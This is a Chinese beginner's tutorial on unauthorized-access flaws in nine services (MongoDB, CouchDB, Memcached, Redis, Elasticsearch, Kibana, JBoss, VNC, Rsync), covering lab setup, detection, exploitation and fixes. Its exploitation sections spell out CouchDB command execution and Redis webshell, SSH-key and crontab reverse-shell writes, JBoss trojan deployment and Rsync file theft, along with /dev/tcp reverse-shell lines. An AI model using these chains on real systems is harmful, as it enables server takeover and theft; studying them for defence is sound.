## 前言

未授权访问是系统对用户限制不全，或者无限制，可以让任意用户或者限制访问用户，访问到需要权限认证的地址。未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。

本片文章主要是在网上现有文章的基础上，结合自己的经验，进行总结、增补，以保证之前没接触过该应用的师傅不用去检索其他资料也可以看懂。（新手向，大佬轻喷）

## MongoDB未授权访问漏洞

### 漏洞简介

MongoDB是一个基于分布式文件存储的数据库，由C++语言编写，旨在为WEB应用提供可扩展的高性能数据存储解决方案。MongoDB默认端口为
**27017** 。

开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。

造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 --auth
也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。

更多MongoDB的介绍请移步：<https://www.runoob.com/mongodb/mongodb-tutorial.html>

### 漏洞复现

#### 环境搭建

这里使用docker。Docker教程：<https://www.runoob.com/docker/docker-tutorial.html>

docker search mongodb # 从Docker Hub查找镜像

![1604631086_5fa4ba2e356394a978e38.png!small?1604631085711](https://image.3001.net/images/20201106/1604631086_5fa4ba2e356394a978e38.png!small?1604631085711)

docker pull mongo #从镜像仓库中拉取或者更新指定镜像

![1604631091_5fa4ba33b6d8a3922810e.png!small?1604631091329](https://image.3001.net/images/20201106/1604631091_5fa4ba33b6d8a3922810e.png!small?1604631091329)

docker images mongo #列出本地主机上的mongo镜像

![1604631095_5fa4ba37cda58a3110284.png!small?1604631095266](https://image.3001.net/images/20201106/1604631095_5fa4ba37cda58a3110284.png!small?1604631095266)

docker run -d -p 27017:27017 --name mongodb mongo # 创建一个新的容器并运行一个命令

![1604631099_5fa4ba3bada2580efa0b1.png!small?1604631099243](https://image.3001.net/images/20201106/1604631099_5fa4ba3bada2580efa0b1.png!small?1604631099243)

docker ps # 显示正在运行的容器

![1604631103_5fa4ba3f70e35c60c3c77.png!small?1604631102864](https://image.3001.net/images/20201106/1604631103_5fa4ba3f70e35c60c3c77.png!small?1604631102864)

  

#### 漏洞检测

Python检测脚本：

    
    
    #! /usr/bin/env python
    # _*_  coding:utf-8 _*_  
      
    

def mongodb(ip,port):

try:

client = MongoClient(ip,port)

db=client.local

flag = db.collection_names()

if flag:

print "[+] Mongodb login for anonymous"

except Exception, e:

pass

nmap检测：

nmap -p 27017 --script mongodb-info <target>

![1604631184_5fa4ba9006764b52da633.png!small?1604631183853](https://image.3001.net/images/20201106/1604631184_5fa4ba9006764b52da633.png!small?1604631183853)

#### 漏洞利用

这里使用 NoSQLBooster

下载地址：<https://s3.mongobooster.com/download/releasesv5/nosqlbooster4mongo-5.1.12.exe>

![1604631190_5fa4ba96e73c76740f2b4.png!small?1604631190364](https://image.3001.net/images/20201106/1604631190_5fa4ba96e73c76740f2b4.png!small?1604631190364)![1604631194_5fa4ba9ab3494e629702f.png!small?1604631194310](https://image.3001.net/images/20201106/1604631194_5fa4ba9ab3494e629702f.png!small?1604631194310)

### 修复方法

(1) 为 MongoDB 添加认证

① MongoDB 启动时添加 -auth 参数。

② 给 MongoDB 添加用户

    
    
    use admin # 使用 admin 库
    db.addUser“用户名” “密码”# 添加用户名、密码
    db.auth“用户名”,“密码”# 验证是否添加成功返回 1 说明成功。

(2) 禁用 HTTP 和 REST 端口

MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6 版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web
服务一般不需要通过 Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数 nohttpinterface =
false。

(3) 限制绑定 IP

启动时加入参数

\--bind_ip 127.0.0.1

或在 /etc/mongodb.conf 文件中添加以下内容

bind_ip = 127.0.0.1

## CouchDB未授权访问漏洞

### 漏洞简介

CouchDB是由Apache软件基金会开发的一个开源数据库。重点是易于使用，拥抱网络。它是一个NoSQL文档存储数据库。它使用JSON，存储数据（文档），使用java脚本作为其查询语言来转换文档，使用http协议为api访问文档，使用Web浏览器查询索引。

CouchDB默认在 **5984** 端口开放Restful的API接口，用于数据库的管理功能。其HTTP
Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关API对服务器上的数据进行任意的增删改查，其中通过API修改local.ini配置文件，可进一步导致执行任意系统命令，获取服务器权限！

更多CouchDB的介绍请移步：<https://www.w3cschool.cn/couchdb/>

### 漏洞复现

#### 环境搭建

这里使用vulhub中的项目来搭建复现环境

Vulhub漏洞环境搭建教程参考：

<https://www.fujieace.com/penetration-test/vulhub.html>

![1604631233_5fa4bac1298b04e6df499.png!small?1604631232678](https://image.3001.net/images/20201106/1604631233_5fa4bac1298b04e6df499.png!small?1604631232678)

#### 漏洞检测

nmap -p 5984 --script couchdb-stats.nse <target>

![1604631239_5fa4bac71b9a6ff90cc89.png!small?1604631239236](https://image.3001.net/images/20201106/1604631239_5fa4bac71b9a6ff90cc89.png!small?1604631239236)![1604631243_5fa4bacb26545a180bd5a.png!small?1604631242668](https://image.3001.net/images/20201106/1604631243_5fa4bacb26545a180bd5a.png!small?1604631242668)![1604631245_5fa4bacd5b0a394f3b4c4.png!small?1604631244851](https://image.3001.net/images/20201106/1604631245_5fa4bacd5b0a394f3b4c4.png!small?1604631244851)

#### 漏洞利用

任意命令执行：

1、新增query_server配置，写入要执行的命令；

    
    
    curl -X PUT 'http://192.168.168.131:5984/_config/query_servers/cmd' -d '"id >/tmp/success"'

2、新建一个临时库和临时表，插入一条记录；

    
    
    curl -X PUT 'http://192.168.168.131:5984/vultest'
    curl -X PUT 'http://192.168.168.131:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'

3、调用query_server处理数据

    
    
    curl -X POST 'http://192.168.168.131:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'

![1604631257_5fa4bad9bff58086767c3.png!small?1604631257490](https://image.3001.net/images/20201106/1604631257_5fa4bad9bff58086767c3.png!small?1604631257490)

### 修复方法

1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到
“bind_address = 0.0.0.0” ，把0.0.0 修改为 127.0.0.1 ，然后保存。

2、设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码。

## Memcached未授权访问漏洞

### 漏洞简介

Memcached是一个自由开源的，高性能，分布式内存对象缓存系统。Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。

Memcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。

由于 Memcached 的安全设计缺陷，客户端连接 Memcached 服务器后无需认证就可读取、修改服务器缓存内容。默认监听端口11211

更多Memcached的介绍请移步：<https://www.runoob.com/Memcached/Memcached-tutorial.html>

### 漏洞复现

#### 环境搭建

64位系统 1.4.4版本：<http://static.runoob.com/download/memcached-win64-1.4.4-14.zip>

解压之后，用管理员权限打开命令行，执行：

memcached.exe -d install 安装

memcached.exe -d start 启动

![1604631292_5fa4bafc8f0861249cf95.png!small?1604631291957](https://image.3001.net/images/20201106/1604631292_5fa4bafc8f0861249cf95.png!small?1604631291957)

查看进程服务以及端口

netstat -ano | findstr 11211

tasklist | findstr Memcached

![1604631295_5fa4baffc50a6e915d82e.png!small?1604631295299](https://image.3001.net/images/20201106/1604631295_5fa4baffc50a6e915d82e.png!small?1604631295299)

#### 漏洞检测

Python检测脚本：

    
    
    #! /usr/bin/env python
    # _*_  coding:utf-8 _*_
    def Memcache_check(ip, port=11211, timeout=5):
        try:
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            s.send("stats\r\n")
            result = s.recv(1024)
            if "STAT version" in result:
                print '[+] Memcache Unauthorized: ' +ip+':'+str(port)
        except Exception, e:
            pass
    

Nmap检测：

nmap -p 11211 --script memcached-info <target>

![1604631330_5fa4bb226da78f17bb7c9.png!small?1604631330107](https://image.3001.net/images/20201106/1604631330_5fa4bb226da78f17bb7c9.png!small?1604631330107)

#### 漏洞利用

telnet <target_ip> 11211 或 nc -vv <target_ip> 11211

无需用户名密码，可以直接连接memcache 服务的11211端口

![1604631334_5fa4bb266e7a477230efc.png!small?1604631333824](https://image.3001.net/images/20201106/1604631334_5fa4bb266e7a477230efc.png!small?1604631333824)

stats #查看memcache服务状态

![1604631338_5fa4bb2a7713e7dd526eb.png!small?1604631337930](https://image.3001.net/images/20201106/1604631338_5fa4bb2a7713e7dd526eb.png!small?1604631337930)

stats items //查看所有items

stats cachedump 32 0 //获得缓存key

漏洞攻击DEMO: <http://blog.nsfocus.net/memcache-unauthorized-access-exploit/>

### 修复方法

1、配置memcached监听本地回环地址127.0.0.1。

    
    
    [root@local ~]# vim /etc/sysconfig/memcached
    OPTIONS="-l 127.0.0.1"  #设置本地为监听
    [root@local ~]# /etc/init.d/memcached restart #重启服务

2、当memcached配置为监听内网IP或公网IP时，使用主机防火墙（iptalbes、firewalld等）和网络防火墙对memcached服务端口进行过滤。

## Redis未授权访问漏洞

### 漏洞简介

Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash),
列表(list), sets 和 sorted sets等类型。

Redis 的出现很大程度上弥补了 memcached 这类 Key/Value 存储的不足在部分场合可以对关系数据库起到很好的补充作用。Redis
默认情况下会绑定在 0.0.0.0:6379这样会将 Redis
服务暴露到公网上。在没有开启认证的情况下会导致任意用户在可以访问目标服务器的情况下未经授权就访问到 Redis 以及读取 Redis 的数据。

等多Redis的介绍请移步：<https://www.runoob.com/redis/redis-tutorial.html>

### 漏洞复现

#### 环境搭建

##### Linux源码安装

wget <http://download.redis.io/releases/redis-6.0.8.tar.gz>#下载

![1604631433_5fa4bb89c513b953bf05b.png!small?1604631433234](https://image.3001.net/images/20201106/1604631433_5fa4bb89c513b953bf05b.png!small?1604631433234)

tar -zxvf redis-6.0.8.tar.gz #解压

![1604631437_5fa4bb8d258c3c90161cf.png!small?1604631436724](https://image.3001.net/images/20201106/1604631437_5fa4bb8d258c3c90161cf.png!small?1604631436724)

cd redis-6.0.8 # 进入redis目录

make #编译

![1604631440_5fa4bb90bb4882d332a02.png!small?1604631440327](https://image.3001.net/images/20201106/1604631440_5fa4bb90bb4882d332a02.png!small?1604631440327)

执行完 make 命令后，redis-6.0.8 的 src 目录下会出现编译后的 redis 服务程序 redis-server，还有用于测试的客户端程序
redis-cli

![1604631444_5fa4bb94c26ecba91f182.png!small?1604631444273](https://image.3001.net/images/20201106/1604631444_5fa4bb94c26ecba91f182.png!small?1604631444273)

下面启动 redis 服务：

    
    
    # cd src
    # ./redis-server

注意这种方式启动 redis 使用的是默认配置。也可以通过启动参数告诉 redis 使用指定配置文件使用下面命令启动。

    
    
    # cd src
    # ./redis-server ../redis.conf

redis.conf 是一个默认的配置文件。我们可以根据需要使用自己的配置文件。

当然现在我们需要每次都进入安装目录才能启动redis服务。现在再做如下配置：

    
    
    cp redis-server /usr/bin/
    cp redis-cli /usr/bin/      #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）
    cd ..
    cp redis.conf /etc/     #将redis.conf拷贝到/etc/目录下
    redis-server /etc/redis.conf  # 使用/etc/目录下的redis.conf文件中的配置启动redis服务

![1604631495_5fa4bbc7413c6982a434e.png!small?1604631494772](https://image.3001.net/images/20201106/1604631495_5fa4bbc7413c6982a434e.png!small?1604631494772)

##### Ubuntu apt 命令安装

在 Ubuntu 系统安装 Redis 可以使用以下命令:

# sudo apt update

# sudo apt install redis-server

![1604631500_5fa4bbcce580d0d704b51.png!small?1604631500434](https://image.3001.net/images/20201106/1604631500_5fa4bbcce580d0d704b51.png!small?1604631500434)

启动 Redis

# redis-server

![1604631504_5fa4bbd0521051bce85fd.png!small?1604631503752](https://image.3001.net/images/20201106/1604631504_5fa4bbd0521051bce85fd.png!small?1604631503752)

查看 redis 是否启动？

# redis-cli

以上命令将打开以下终端：

redis 127.0.0.1:6379>

127.0.0.1 是本机 IP ，6379 是 redis 服务端口。现在我们输入 PING 命令。

![1604631508_5fa4bbd447c1b93f337d0.png!small?1604631508170](https://image.3001.net/images/20201106/1604631508_5fa4bbd447c1b93f337d0.png!small?1604631508170)

以上说明我们已经成功安装了redis。

安装完成redis之后，修改配置文件redis.conf：

    
    
    bind 127.0.0.1前面加上#号注释掉
    protected-mode设为no

#### 漏洞检测

Nmap检测：

nmap -p 6379 --script redis-info <target>

![1604631524_5fa4bbe44255906d8d0eb.png!small?1604631523937](https://image.3001.net/images/20201106/1604631524_5fa4bbe44255906d8d0eb.png!small?1604631523937)![1604631526_5fa4bbe6bfe0b70d6c661.png!small?1604631526281](https://image.3001.net/images/20201106/1604631526_5fa4bbe6bfe0b70d6c661.png!small?1604631526281)

#### 漏洞利用

Redis未授权访问漏洞有多种利用方法，具体请看：<https://www.freebuf.com/articles/network/158065.html>

这里仅复现其中的一部分。

##### 0x01 绝对路径写入webshell

通过redis在指定的web目录下写入一句话木马，用菜刀连接可达到控制服务器的目的。

利用条件：

1、目标存在web目录

2、已知web绝对路径

3、存在写入权限

适用范围：windows，linux版本。

利用过程：

利用redis写入一个webshell到目标web目录下:

    
    
    config set dir "/var/www/html"
    config set dbfilename phpinfo.php
    set x "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
    save

![1604631551_5fa4bbffe4f4b0a64bb80.png!small?1604631551346](https://image.3001.net/images/20201106/1604631551_5fa4bbffe4f4b0a64bb80.png!small?1604631551346)

\r\n\r\n代表换行的意思，用redis入的文件会自带一些版本信息，如果不换行可能会导致无法执行。

![1604631555_5fa4bc0397b7628ddb2c1.png!small?1604631555114](https://image.3001.net/images/20201106/1604631555_5fa4bc0397b7628ddb2c1.png!small?1604631555114)

写入成功

![1604631558_5fa4bc0687ee4ba2c8f5b.png!small?1604631558006](https://image.3001.net/images/20201106/1604631558_5fa4bc0687ee4ba2c8f5b.png!small?1604631558006)

（将写入内容换成php一句话即可getshell）

##### 0x02 在crontab里写定时任务，反弹shell

利用条件：

权限可写计划任务

使用范围：centos

只能在centos下反弹，这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败

利用过程：

在权限足够的情况下，利用redis写入文件到计划任务目录下执行。

首先监听端口。

    
    
    nc -lvvp 8769

利用redis生成计划任务配置文件。

    
    
    config set dir /var/spool/cron
    set x "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/xxx.xxx.xxx.xxx/8769 0>&1\n\n"
    config set dbfilename root
    save

每一分钟执行一次，只有目标主机是centos才可以成功接收到反弹的shell。

##### 0x03 写入ssh公钥，获取root权限

使用范围：开启了密钥认证的linux主机

利用条件：

1、root权限

2、开启了ssh密钥登录，存在/etc/.ssh文件

利用过程：

当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。

1、首先在靶机上开启ssh密钥登录。

修改/etc/ssh/sshd_config配置文件:

    
    
    RSAAuthentication设置为yes，意思是设置开启使用RSA算法的基于rhosts的安全验证；
    PubkeyAuthentication设置为yes，意思是设置开启公钥验证；
    AuthorizedKeyFiles后面的目录，是你上传的公钥所保存的文件。

![1604631602_5fa4bc32bf920f9dcd256.png!small?1604631602354](https://image.3001.net/images/20201106/1604631602_5fa4bc32bf920f9dcd256.png!small?1604631602354)

然后重启服务

systemctl restart sshd.service

2、生成密钥

在攻击机中使用自带的命令生成一对密钥。

ssh-keygen -t rsa

![1604631608_5fa4bc38b8a03d380eba7.png!small](https://image.3001.net/images/20201106/1604631608_5fa4bc38b8a03d380eba7.png!small)

3、将公钥内容导入key.txt文件

(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt

![1604631614_5fa4bc3e4088901066910.png!small?1604631613807](https://image.3001.net/images/20201106/1604631614_5fa4bc3e4088901066910.png!small?1604631613807)

4、将生成的公钥内容设置给redis里的变量

cat /root/key.txt | redis-cli -h 192.168.168.133 -x set xxx

![1604631618_5fa4bc425aa436fce3249.png!small?1604631617777](https://image.3001.net/images/20201106/1604631618_5fa4bc425aa436fce3249.png!small?1604631617777)

5、在 /root/.ssh 目录下生成authorized_keys文件。

redis-cli -h 192.168.168.133

config set dir /root/.ssh

config set dbfilename authorized_keys

![1604631622_5fa4bc4637d009010a2e2.png!small?1604631621677](https://image.3001.net/images/20201106/1604631622_5fa4bc4637d009010a2e2.png!small?1604631621677)

成功写入authorized_keys文件。

![1604631625_5fa4bc494e77178dd18cd.png!small?1604631624722](https://image.3001.net/images/20201106/1604631625_5fa4bc494e77178dd18cd.png!small?1604631624722)

6、使用本地的私钥连接ssh

ssh 192.168.168.133

![1604631628_5fa4bc4cd46f687effcb7.png!small?1604631628567](https://image.3001.net/images/20201106/1604631628_5fa4bc4cd46f687effcb7.png!small?1604631628567)

连接成功。

##### 0x04 主从复制RCE

在Reids
4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。

通过脚本实现一键自动化getshell：

1、生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。

    
    
    git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
    cd RedisModules-ExecuteCommand/
    make

![1604631646_5fa4bc5ec196f3caca10c.png!small?1604631646295](https://image.3001.net/images/20201106/1604631646_5fa4bc5ec196f3caca10c.png!small?1604631646295)

2、攻击端执行： python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so

    
    
    git clone https://github.com/Ridter/redis-rce.git
    cd redis-rce/
    cp .. /module.so ./
    pip install -r requirements.txt
    python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so

-r参数是指目标redis IP地址

-L参数是指本机的ip地址

执行命令后，本机21000端口生成一个redis服务，然后目标redis指定本机为主服务器，同步执行so文件。

执行成功后可以选择生成一个交互的shell，或者重新反弹一个shell。

![1604631664_5fa4bc7022219fc48b491.png!small?1604631663689](https://image.3001.net/images/20201106/1604631664_5fa4bc7022219fc48b491.png!small?1604631663689)

### 修复方法

（1）对redis访问启动密码认证。

（2）配置 bind 选项限定可以连接 Reids 服务器的 IP并修改默认端口 6379。

## ElasticSearch未授权访问漏洞

### 漏洞简介

Elasticsearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful
web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。

Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300端口的服务器进行恶意攻击。

更多ElasticSearch的介绍请移步：<https://www.bootwiki.com/elasticsearch/elasticsearch-tutorial.html>

### 漏洞复现

#### 环境搭建

下载安装包：<https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.0.zip>

解压，进入bin 目录，双击执行 elasticsearch.bat

![1604631673_5fa4bc7912ba7353211fd.png!small?1604631672919](https://image.3001.net/images/20201106/1604631673_5fa4bc7912ba7353211fd.png!small?1604631672919)

访问http://localhost:9200/，出现以下页面，说明安装成功。

![1604631677_5fa4bc7d01d6c1c73ccba.png!small?1604631676436](https://image.3001.net/images/20201106/1604631677_5fa4bc7d01d6c1c73ccba.png!small?1604631676436)

#### 漏洞检测

Python检测脚本：

    
    
    #! /usr/bin/env python
    # _*_  coding:utf-8 _*_
    
    import requests
    def Elasticsearch_check(ip, port=9200, timeout=5):
        try:
        　　url = "http://"+ip+":"+str(port)+"/_cat"
        　　response = requests.get(url) 
        except:
        　　pass
        if "/_cat/master" in response.content:
        　　print '[+] Elasticsearch Unauthorized: ' +ip+':'+str(port)
    

#### 漏洞利用

http://localhost:9200/_cat/indices

http://localhost:9200/_river/_search //查看数据库敏感信息

http://localhost:9200/_nodes //查看节点数据

如有安装head插件：

http://localhost:9200/_plugin/head/ //web管理界面

![1604631700_5fa4bc94e5100ccff1004.png!small?1604631700512](https://image.3001.net/images/20201106/1604631700_5fa4bc94e5100ccff1004.png!small?1604631700512)![1604631703_5fa4bc97efcb3d14709b5.png!small?1604631703505](https://image.3001.net/images/20201106/1604631703_5fa4bc97efcb3d14709b5.png!small?1604631703505)

### 修复方法

1、限制IP访问，绑定固定IP

2、在config/elasticsearch.yml中为9200端口设置认证：

    
    
    http.basic.enabled true #开关，开启会接管全部HTTP连接
    http.basic.user "admin" #账号
    http.basic.password "admin_pw" #密码
    http.basic.ipwhitelist ["localhost", "127.0.0.1"]

## Kibana未授权访问漏洞

### 漏洞简介

Kibana是一个开源的数据分析和可视化平台，旨在与Elasticsearch协同工作，帮助分析师通过图形的方式来理解复杂的数据流动。

Kibana拥有一个基于浏览器的管理界面，可实时从Elasticsearch中获取数据，然后执行高级数据分析，最后将结果以图表，表格和地图的形式呈现出来。

在默认设置下，Kibana会开放在端口5601上。

Kibana本身没有任何安全性设置，在默认配置下，Kibana就可以访问Elasticsearch中的所有数据。

### 漏洞复现

直接访问kibana的页面，如：

<https://192.168.168.131:5601/>

<http://192.168.168.131:5601/app/kibana#/>

并且无需账号密码可以登录进入界面。

![1604631730_5fa4bcb2e6710d0517515.png!small?1604631730353](https://image.3001.net/images/20201106/1604631730_5fa4bcb2e6710d0517515.png!small?1604631730353)

### 修复方法

1、设置防火墙策略，仅允许指定的 IP 来访问服务。

2、通过nginx设置反向代理，设置密码登录验证。

Step1、设置kibana监听本地地址，并设置ElasticSearch登录的账号和密码：

    
    
    elasticsearch.url: "http://127.0.0.1:9200"
    #这里输入ElasticSearch的账号和密码
    elasticsearch.username: "user"
    elasticsearch.password: "pass"

Step2：使用htpasswd创建kibana登录的账号密码，这里可以复用ElasticSearch创建的账号密码，也可以重新创建一个。

    
    
    htpasswd -c /usr/local/service/nginx/conf/htpasswd username

Step3：配置nginx反向代理，配置好后，重启nginx和kibana，通过15601登录验证访问Kibana

    
    
    server {
        # 通过反向代理对kibana身份认证
        listen 15601;
        server_name localhost;
        location / { 
            auth_basic "xscan";
            auth_basic_user_file /usr/local/service/nginx/conf/htpasswd;
            
            proxy_pass http://127.0.0.1:5601;
             }
         }
    

## JBoss未授权访问漏洞

### 漏洞简介

jBoss是一个基于J2EE的开发源代码的应用服务器。
JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB
2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。

默认端口:8080,9990

默认情况下访问 http://ip:8080/jmx-console 就可以浏览 jboss
的部署管理的信息，不需要输入用户名和密码，可以直接部署上传木马有安全隐患。

### 漏洞复现

#### 环境搭建

这里使用vulhub中CVE-2017-7504的漏洞环境。

Vulhub的漏洞环境搭建教程参考：<https://www.fujieace.com/penetration-test/vulhub.html>

![1604631791_5fa4bcefc8172c4bb329f.png!small?1604631791282](https://image.3001.net/images/20201106/1604631791_5fa4bcefc8172c4bb329f.png!small?1604631791282)

![1604631795_5fa4bcf3183080d24d4e6.png!small?1604631794566](https://image.3001.net/images/20201106/1604631795_5fa4bcf3183080d24d4e6.png!small?1604631794566)

#### 漏洞检测

先用 nmap 扫描查看端口开放情况看是否开放 JBOSS 端口。再使用漏洞测试工具测试 jmx 组件存在情况通过访问 http://ip:jboss端口/
看是否能进入 jmx-console 和 web-console 。

检测工具：jexboss（<https://github.com/joaomatosf/jexboss>）一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXInvokerServlet这三个漏洞，并且可以获得一个shell。

#### 漏洞利用

点击进入控制页

![1604631800_5fa4bcf8e0f95774e8bf5.png!small?1604631800354](https://image.3001.net/images/20201106/1604631800_5fa4bcf8e0f95774e8bf5.png!small?1604631800354)

点击jboss.deployment进入应用部署页面

![1604631804_5fa4bcfc9defdf396b468.png!small?1604631804116](https://image.3001.net/images/20201106/1604631804_5fa4bcfc9defdf396b468.png!small?1604631804116)

将jsp马打包成war包 jar -cvf shell.war api_all_jdk.jsp

![1604631808_5fa4bd004054f0b4bfc03.png!small?1604631807812](https://image.3001.net/images/20201106/1604631808_5fa4bd004054f0b4bfc03.png!small?1604631807812)

将war包放到web服务器上

![1604631812_5fa4bd047f160ac0eff47.png!small?1604631811972](https://image.3001.net/images/20201106/1604631812_5fa4bd047f160ac0eff47.png!small?1604631811972)

通过addurl参数进行木马的远程部署

<http://192.168.168.128/shell.war>

![1604631816_5fa4bd0825b4d828d4a3a.png!small?1604631815571](https://image.3001.net/images/20201106/1604631816_5fa4bd0825b4d828d4a3a.png!small?1604631815571)

成功上传木马

![1604631819_5fa4bd0b9cb3d4d90a265.png!small?1604631819089](https://image.3001.net/images/20201106/1604631819_5fa4bd0b9cb3d4d90a265.png!small?1604631819089)

访问http://IP:8080/war包名/包名内文件名即可成功连接。

### 修复方法

  * 对jmx控制页面访问添加访问验证
  * 删除JMX Console,后重启JBoss

## VNC未授权访问漏洞

### 漏洞简介

VNC 是虚拟网络控制台Virtual Network
Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux
的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 5900、5901。VNC
未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重。

### 漏洞复现

#### 环境搭建

下载https://archive.realvnc.com/download/

#### 漏洞检测

Metasploit的use auxiliary/scanner/vnc/vnc_none_auth模块

#### 漏洞利用

Kali运行 vncviewer <target_ip>

### 修复方法

(1) 配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码。

(2) 以最小权限的普通用户身份运行操作系统。

## Rsync 未授权访问漏洞

### 漏洞简介

Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN
快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync
默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 837。

更多Rsync的介绍请移步：<https://www.linuxprobe.com/use-rsync-file.html>

### 漏洞复现

#### 环境搭建

这里使用vulhub中的项目来搭建复现环境

Vulhub漏洞环境搭建教程参考：

<https://www.fujieace.com/penetration-test/vulhub.html>

![1604631839_5fa4bd1f8ef8e092b1225.png!small?1604631839374](https://image.3001.net/images/20201106/1604631839_5fa4bd1f8ef8e092b1225.png!small?1604631839374)

![1604631842_5fa4bd22622dedadf0096.png!small?1604631842217](https://image.3001.net/images/20201106/1604631842_5fa4bd22622dedadf0096.png!small?1604631842217)

#### 漏洞检测

nmap检测：

nmap -p 873 --script rsync-list-modules <target>

![1604631846_5fa4bd260d680d20ec32b.png!small?1604631845506](https://image.3001.net/images/20201106/1604631846_5fa4bd260d680d20ec32b.png!small?1604631845506)

Metasploit的auxiliary/scanner/rsync/modules_list模块

![1604631850_5fa4bd2a83b8b2182d12c.png!small?1604631850001](https://image.3001.net/images/20201106/1604631850_5fa4bd2a83b8b2182d12c.png!small?1604631850001)

#### 漏洞利用

##### 列出目标服务器的同步目录

    
    
    rsync 192.168.168.131::
    rsync rsync://192.168.168.131:873

![1604631854_5fa4bd2ec69513259ee69.png!small?1604631854322](https://image.3001.net/images/20201106/1604631854_5fa4bd2ec69513259ee69.png!small?1604631854322)

##### 查看模块文件

获取到目录之后，只需在路径后添加目录名即可查看目录中的文件

    
    
    rsync rsync://192.168.168.131:873/src

![1604631859_5fa4bd3349db38eb84edb.png!small?1604631858934](https://image.3001.net/images/20201106/1604631859_5fa4bd3349db38eb84edb.png!small?1604631858934)

可以看到成功列出src目录

##### 任意文件下载

    
    
    rsync rsync://192.168.168.131/src/etc/passwd ./pass.txt

![1604631863_5fa4bd37e63aa9b54f665.png!small?1604631863554](https://image.3001.net/images/20201106/1604631863_5fa4bd37e63aa9b54f665.png!small?1604631863554)

##### 任意文件上传

    
    
    rsync 1.txt rsync://192.168.168.131/src/home/

![1604631867_5fa4bd3b5f48fb9abe1a8.png!small?1604631866851](https://image.3001.net/images/20201106/1604631867_5fa4bd3b5f48fb9abe1a8.png!small?1604631866851)

通过任意文件上传，可以直接写WebShell（如果目标有Web服务的话），或者可以通过写ssh公钥实现获取权限，或者通过写cron定时任务反弹shell。

##### 通过写cron任务反弹shell

1、下载cron定时任务配置文件并且查看任务内容

![1604631909_5fa4bd65804a5cd916e5d.png!small?1604631909784](https://image.3001.net/images/20201106/1604631909_5fa4bd65804a5cd916e5d.png!small?1604631909784)

//17 * * * * root cd / && run-parts --report /etc/cron.hourly

//表示17分钟会启动/etc/cron.hourly目录下文件的任务

2、构造shell

#!/bin/bash

/bin/bash -i >& /dev/tcp/192.168.168.133/8796 0>&1

![1604631918_5fa4bd6e396e16bb5c1dc.png!small?1604631917655](https://image.3001.net/images/20201106/1604631918_5fa4bd6e396e16bb5c1dc.png!small?1604631917655)

赋予执行权限

chmod +x shell

3、把shell上传至/etc/cron.hourly目录下

写入cron.hourly下文件的任务就会启动

rsync -av shell rsync://127.0.0.1/src/etc/cron.hourly

